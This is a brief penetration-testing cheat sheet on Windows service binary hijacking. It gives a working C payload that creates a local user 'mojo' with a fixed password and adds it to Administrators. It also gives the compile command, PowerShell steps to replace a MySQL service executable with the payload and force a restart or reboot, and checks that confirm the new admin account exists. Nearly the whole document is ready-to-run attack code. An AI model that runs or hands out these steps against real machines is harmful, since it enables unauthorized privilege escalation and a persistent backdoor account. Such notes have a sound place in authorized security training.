# Service Binary Hijacking

Used when we discover we have write permissions over the binary associated with a service.

**adduser.c**

```c
#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user mojo Password123! /add");
  i = system ("net localgroup administrators mojo /add");
  return 0;
}
```

```bash
# Compile
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
# Backup and move in our new binary
mv C:\xampp\mysql\bin\mysqld.exe backups\mysqld.exe.bak
mv .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Restart the service if we have permissions
net stop mysql

# If denied access, check if autorestart is enabled (Auto)
Get-CimInstance -ClassName win32_service | Where-Object {$_.Name -like '$SERVICE'}
shutdown /r /t 0
```

After reboot, we can check and see that our new user has been created!

```powershell
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```